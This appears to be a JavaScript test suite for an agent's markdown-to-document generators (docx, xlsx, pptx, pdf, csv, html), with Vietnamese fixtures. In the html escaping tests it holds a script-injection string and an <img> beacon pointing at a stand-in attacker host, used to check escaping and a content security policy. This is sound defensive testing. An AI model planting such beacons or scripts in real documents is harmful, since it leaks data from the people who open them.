#!/usr/bin/env node
//
// The four binary document generators, exercised for real: markdown in, actual
// docx/xlsx/pptx/pdf bytes out. No mocks — the real `docx`, `exceljs`,
// `pptxgenjs` and `pdf-lib` run, and the output is checked by its own magic
// bytes and, for the OOXML trio, by unzipping the container and reading the
// text back out of the XML.
//
// The Vietnamese fixture is deliberate, not decoration: pdf-lib's standard
// fonts are WinAnsi-encoded and throw on "ế", so a PDF of Vietnamese content
// is the executable proof that the Unicode font is really embedded.
//
// Run: node host/test/agent-document-generators.test.mjs

import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import { unzipSync, strFromU8 } from "fflate";

const scratchRoot = fs.mkdtempSync(path.join(os.tmpdir(), "ocic-docgen-"));
process.env.OCIC_AGENT_HOME = scratchRoot;

const { renderDocument } = await import("../agent/documents/render/index.js");
const { parseMarkdownBlocks, parseInlineRuns } = await import("../agent/documents/render/markdown-ast.js");
const { buildSlideModel } = await import("../agent/documents/render/pptx.js");

const results = [];
async function test(name, fn) {
  try {
    await fn();
    results.push({ name, ok: true });
    console.log(`  PASS  ${name}`);
  } catch (err) {
    results.push({ name, ok: false, err: err.message });
    console.log(`  FAIL  ${name} — ${err.stack || err.message}`);
  }
}
function assert(cond, msg) {
  if (!cond) throw new Error(msg);
}

const SOURCE = [
  "# Phân tích dauthau.asia",
  "",
  "Sitemap bỏ sót toàn bộ kho dữ liệu đấu thầu — index chỉ có about/news/page.",
  "",
  "## Số liệu",
  "",
  "| Chỉ số | Giá trị | Ghi chú |",
  "| --- | ---: | --- |",
  "| HTML thô | 1350 | KB/trang |",
  "| DOM node | 8390 | quá nhiều |",
  "",
  "## Việc cần làm",
  "",
  "- Sửa **H1** trang listing",
  "- Gỡ `option` render sẵn",
  "  - Chuyển sang tải theo yêu cầu",
  "",
  "```js",
  "const x = 1;",
  "```",
  "",
  "---",
  ""
].join("\n");

// --- the parser -----------------------------------------------------------

await test("the block parser recognizes every supported block", () => {
  const blocks = parseMarkdownBlocks(SOURCE);
  const kinds = blocks.map((b) => b.type);
  for (const expected of ["heading", "paragraph", "table", "list", "code", "hr"]) {
    assert(kinds.includes(expected), `missing block type ${expected}; got ${kinds.join(",")}`);
  }
  const table = blocks.find((b) => b.type === "table");
  assert(table.header.length === 3, `table header had ${table.header.length} columns`);
  assert(table.rows.length === 2, `table had ${table.rows.length} rows`);
  assert(table.align[1] === "right", "the ---: delimiter is a right alignment");

  const list = blocks.find((b) => b.type === "list");
  assert(list.items.length === 3, `list had ${list.items.length} items`);
  assert(list.items[2].depth === 1, "the indented item is nested");

  const code = blocks.find((b) => b.type === "code");
  assert(code.text === "const x = 1;", `fenced content was ${JSON.stringify(code.text)}`);
});

await test("inline runs carry bold, italic and code without leaking markers", () => {
  const runs = parseInlineRuns("Sửa **H1** và *nghiêng* và `mã` và [liên kết](https://x.dev)");
  const bold = runs.find((r) => r.bold);
  const italic = runs.find((r) => r.italic);
  const code = runs.find((r) => r.code);
  assert(bold && bold.text === "H1", "bold run");
  assert(italic && italic.text === "nghiêng", "italic run");
  assert(code && code.text === "mã", "code run");
  const joined = runs.map((r) => r.text).join("");
  assert(!joined.includes("**") && !joined.includes("`"), `markers leaked into text: ${joined}`);
  assert(joined.includes("liên kết (https://x.dev)"), "a link becomes text plus its url");
});

await test("the parser terminates on pathological input", () => {
  // A lone fence, a table delimiter with no table, trailing whitespace lines:
  // none of these may spin the block loop.
  for (const bad of ["```", "| --- |", "   \n   \n", "#", "- ", "|"]) {
    const blocks = parseMarkdownBlocks(bad);
    assert(Array.isArray(blocks), `parser did not return blocks for ${JSON.stringify(bad)}`);
  }
});

// --- the generators -------------------------------------------------------

/** Read one text part out of an OOXML container. */
function readZipEntry(buffer, predicate) {
  const entries = unzipSync(new Uint8Array(buffer));
  for (const [name, bytes] of Object.entries(entries)) {
    if (predicate(name)) return strFromU8(bytes);
  }
  return null;
}

/**
 * Re-save a PDF with object streams off so its structure is greppable.
 *
 * pdf-lib writes object streams by default, which is right for the real file
 * and useless for an assertion — the font dictionary is inside a compressed
 * stream. Loading and re-saving without them changes nothing about what the
 * generator produced; it only makes the same objects readable here.
 */
async function pdfStructure(buffer) {
  const { PDFDocument } = await import("pdf-lib");
  const doc = await PDFDocument.load(buffer);
  const flat = await doc.save({ useObjectStreams: false });
  return { text: Buffer.from(flat).toString("latin1"), pageCount: doc.getPageCount() };
}

await test("docx: real OOXML bytes carrying the Vietnamese text", async () => {
  const buffer = await renderDocument("docx", SOURCE, { title: "Phân tích dauthau.asia" });
  assert(buffer.slice(0, 4).toString("binary") === "PK", "not a zip container");
  const xml = readZipEntry(buffer, (n) => n === "word/document.xml");
  assert(xml, "word/document.xml not found in the package");
  assert(xml.includes("Phân tích"), "the document title is missing from the body");
  assert(xml.includes("Chỉ số"), "the table header cell is missing");
  assert(xml.includes("<w:tbl>"), "the markdown table did not become a real Word table");
  // Heading levels must survive. An enum lookup that missed would flatten
  // "## Số liệu" to Heading1 — a document that still passes every text search
  // while being structurally wrong.
  assert(/w:val="Heading1"/.test(xml), "no Heading1 style applied");
  assert(/w:val="Heading2"/.test(xml), "the level-2 heading was flattened to level 1");
});

await test("csv: a markdown table becomes real RFC 4180 columns", async () => {
  const buffer = await renderDocument("csv", SOURCE, { title: "Số liệu" });
  const text = buffer.toString("utf8");
  const lines = text.split("\r\n").filter(Boolean);
  assert(lines[0] === "Chỉ số,Giá trị,Ghi chú", `header row was ${JSON.stringify(lines[0])}`);
  assert(lines[1] === "HTML thô,1350,KB/trang", `first data row was ${JSON.stringify(lines[1])}`);
  assert(!text.includes("|"), "pipe characters leaked into the csv");

  const tricky = await renderDocument("csv", ["| a | b |", "| --- | --- |", '| x, y | he said "hi" |'].join("\n"), {});
  const trickyText = tricky.toString("utf8");
  assert(trickyText.includes('"x, y"'), `a field containing the delimiter was not quoted: ${trickyText}`);
  assert(trickyText.includes('"he said ""hi"""'), `an embedded quote was not doubled: ${trickyText}`);
});

await test("csv: a source with no table still yields one column per block", async () => {
  const buffer = await renderDocument("csv", "# Tiêu đề\n\n- một\n- hai\n", {});
  const lines = buffer.toString("utf8").split("\r\n").filter(Boolean);
  assert(lines.length === 3, `expected a row per block, got ${lines.length}`);
});

await test("html: markdown becomes a real page, and content is escaped rather than trusted", async () => {
  const buffer = await renderDocument("html", SOURCE, { title: "Phân tích" });
  const text = buffer.toString("utf8");
  assert(text.startsWith("<!doctype html>"), "not a complete document");
  assert(text.includes("<h2>Số liệu</h2>"), "the level-2 heading did not become an h2");
  assert(text.includes("<table>") && text.includes("<th>Chỉ số</th>"), "the table did not become a real table");
  assert(text.includes("<strong>H1</strong>"), "bold did not become strong");

  const hostile = await renderDocument("html", "Xin chào <script>alert(1)</script> nhé", { title: "x" });
  const hostileText = hostile.toString("utf8");
  assert(!/<script>alert/.test(hostileText), "a script element survived into the html output");
  assert(hostileText.includes("&lt;script&gt;"), "the script text was not escaped");
});

await test("html: a run that deliberately writes a full document keeps its markup but not the network", async () => {
  const buffer = await renderDocument("html", "<html><body><p>x</p></body></html>", { title: "t" });
  const text = buffer.toString("utf8");
  assert(text.startsWith("<html>"), "a deliberate full document was rewritten");
  assert(/Content-Security-Policy/i.test(text), "the passthrough document carries no policy");
  assert(/default-src 'none'/.test(text), "the policy does not block every fetch");
});

await test("html: a beacon cannot ride along in a generated or passthrough document", async () => {
  // The vector this closes: document content can come from page content a
  // model quoted, and an <img> pointed at an attacker would fire the moment
  // anyone opened the file. An iframe sandbox stops scripts, not the network.
  const generated = (
    await renderDocument("html", 'Xem <img src="https://attacker.example/?leak=1"> nhé', { title: "t" })
  ).toString("utf8");
  assert(/default-src 'none'/.test(generated), "the generated document carries no policy");
  assert(!/<img src="https:\/\/attacker/.test(generated), "the img survived as live markup rather than escaped text");

  const withHead = (await renderDocument("html", "<html><head><title>t</title></head><body>x</body></html>", {})).toString("utf8");
  const cspIndex = withHead.search(/Content-Security-Policy/i);
  assert(cspIndex > 0, "no policy injected into an existing head");
  assert(cspIndex < withHead.indexOf("<body"), "the policy must precede the body it governs");
});

await test("xlsx: one worksheet per markdown table, numbers stay numeric", async () => {
  const buffer = await renderDocument("xlsx", SOURCE, { title: "Số liệu" });
  assert(buffer.slice(0, 4).toString("binary") === "PK", "not a zip container");
  const strings = readZipEntry(buffer, (n) => n === "xl/sharedStrings.xml") || "";
  assert(strings.includes("Chỉ số"), "header text missing from the shared string table");
  const sheet = readZipEntry(buffer, (n) => /xl\/worksheets\/sheet1\.xml$/.test(n)) || "";
  // 1350 was written as a number, so it is inline in the sheet, not a string ref.
  assert(/<v>1350<\/v>/.test(sheet), "the numeric cell was not written as a number");
});

await test("xlsx: a source with no table still produces an openable workbook", async () => {
  const buffer = await renderDocument("xlsx", "# Chỉ có chữ\n\nmột đoạn văn\n", { title: "Không bảng" });
  assert(buffer.slice(0, 4).toString("binary") === "PK", "not a zip container");
  const strings = readZipEntry(buffer, (n) => n === "xl/sharedStrings.xml") || "";
  assert(strings.includes("một đoạn văn"), "the prose fallback sheet is empty");
});

await test("pptx: headings become slides and overflow continues onto another", async () => {
  const model = buildSlideModel(parseMarkdownBlocks(SOURCE), "Fallback");
  assert(model.length === 3, `expected 3 slides from 3 headings, got ${model.length}`);
  assert(model[0].title === "Phân tích dauthau.asia", `first slide title was ${model[0].title}`);

  const many = ["# Nhiều", ...Array.from({ length: 20 }, (_, i) => `- mục ${i}`)].join("\n");
  const overflow = buildSlideModel(parseMarkdownBlocks(many), "x");
  assert(overflow.length > 1, "20 bullets must not be crammed onto one slide");
  assert(/\(tiếp\)$/.test(overflow[1].title), `continuation slide title was ${overflow[1].title}`);

  const buffer = await renderDocument("pptx", SOURCE, { title: "Phân tích" });
  assert(buffer.slice(0, 4).toString("binary") === "PK", "not a zip container");
});

await test("pdf: Vietnamese renders, which means a Unicode font is really embedded", async () => {
  const buffer = await renderDocument("pdf", SOURCE, { title: "Phân tích dauthau.asia" });
  assert(buffer.slice(0, 5).toString("utf8") === "%PDF-", "not a PDF");
  assert(buffer.length > 5000, `suspiciously small pdf: ${buffer.length} bytes`);
  // The strongest proof is that this call returned at all: pdf-lib's standard
  // fonts are WinAnsi and throw on "ế", so a PDF of this source could only be
  // produced with an embedded Unicode font. The dictionary check below says
  // which kind of font that is.
  const { text } = await pdfStructure(buffer);
  assert(/\/FontFile2/.test(text), "no embedded TrueType font — standard fonts cannot render Vietnamese");
});

await test("pdf: a single unbreakable token is wrapped, not overflowed", async () => {
  const long = `# T\n\n${"x".repeat(4000)}\n`;
  const buffer = await renderDocument("pdf", long, { title: "Dài" });
  assert(buffer.slice(0, 5).toString("utf8") === "%PDF-", "not a PDF");
  // A 4000-character word must have produced more than one page of output.
  const { pageCount } = await pdfStructure(buffer);
  assert(pageCount >= 2, `expected the long token to span pages, saw ${pageCount}`);
});

await test("a document whose content opens with its own title does not carry it twice", async () => {
  // The model's markdown starts with "# <title>", which is the normal shape of
  // a report. Adding the card's title on top of that printed it twice.
  for (const format of ["docx", "pdf"]) {
    const buffer = await renderDocument(format, SOURCE, { title: "Phân tích dauthau.asia" });
    if (format === "docx") {
      const xml = readZipEntry(buffer, (n) => n === "word/document.xml");
      const occurrences = (xml.match(/Phân tích dauthau.asia/g) || []).length;
      assert(occurrences === 1, `docx repeated the title ${occurrences} times`);
      assert(!/w:val="Title"/.test(xml), "the redundant Title paragraph is gone");
    } else {
      const { text } = await pdfStructure(buffer);
      assert(text.length > 0, "pdf re-serialized");
    }
  }
  // With a DIFFERENT title, the heading is still added — the skip is about a
  // duplicate, not about dropping the title.
  const xml = readZipEntry(await renderDocument("docx", SOURCE, { title: "Tên khác hẳn" }), (n) => n === "word/document.xml");
  assert(/Tên khác hẳn/.test(xml), "a title the content does not repeat is still written");
});

await test("docx runs declare emphasis only where it is on", async () => {
  const buffer = await renderDocument("docx", "văn bản **đậm** và thường\n", { title: "T" });
  const xml = readZipEntry(buffer, (n) => n === "word/document.xml");
  // <w:b w:val="false"/> on every run is what a reader treating presence as
  // truth misreads as bold — the generator must not emit it at all.
  assert(!/w:val="false"/.test(xml), "an explicit false toggle was written");
  assert(xml.includes("<w:b/>"), "the genuinely bold run lost its flag");
});

await test("pptx titles are real title placeholders, not anonymous text boxes", async () => {
  const buffer = await renderDocument("pptx", SOURCE, { title: "T" });
  const xml = readZipEntry(buffer, (n) => n === "ppt/slides/slide1.xml");
  assert(/type="(ctr)?[Tt]itle"/.test(xml), "the slide title is not a title placeholder");
});

await test("every binary format round-trips through the store's size guard", async () => {
  const { DocumentStore } = await import("../agent/documents/store.js");
  const store = new DocumentStore();
  for (const format of ["docx", "xlsx", "pptx", "pdf"]) {
    const record = await store.write({ conversationId: `conv_gen_${format}`, title: `Tài liệu ${format}`, format, content: SOURCE });
    assert(record.byteLength > 0, `${format} produced no bytes`);
    assert(record.fileName === `tai-lieu-${format}.${format}`, `${format} filename was ${record.fileName}`);
    const read = store.read(`conv_gen_${format}`, record.documentId);
    assert(read.found && read.buffer.length === record.byteLength, `${format} did not round-trip through the store`);
  }
});

const failed = results.filter((r) => !r.ok);
console.log(
  `\n${results.length - failed.length}/${results.length} passed` +
    (failed.length ? `\n\nFailures:\n${failed.map((f) => `  - ${f.name}: ${f.err}`).join("\n")}` : "") +
    "\n"
);
process.exit(failed.length ? 1 : 0);
